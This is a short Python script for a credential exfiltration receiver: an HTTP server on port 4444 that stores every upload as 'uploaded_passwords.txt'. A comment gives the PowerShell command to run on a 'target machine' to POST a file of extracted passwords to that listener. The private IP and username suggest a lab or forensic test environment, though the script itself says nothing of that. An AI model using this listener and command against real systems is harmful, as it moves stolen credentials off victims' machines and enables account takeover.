from http.server import HTTPServer, BaseHTTPRequestHandler
import os

# Usage on Target Maschine
# > Invoke-WebRequest -Uri "http://192.168.122.1:4444/upload" -Method POST -InFile "C:\Users\fortrace\Desktop\extracted_passwords.txt" -UseBasicParsing


class FileUploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Handle raw file uploads via HTTP POST"""
        file_length = int(self.headers['Content-Length'])
        filename = "uploaded_passwords.txt"  # Save all uploads as this file

        with open(filename, "wb") as output_file:
            output_file.write(self.rfile.read(file_length))

        self.send_response(200)
        self.end_headers()
        self.wfile.write(f"File {filename} uploaded successfully!".encode())

if __name__ == "__main__":
    server_address = ("", 4444)  # Listen on port 4444
    httpd = HTTPServer(server_address, FileUploadHandler)
    print("Server listening on port 4444...")
    httpd.serve_forever()
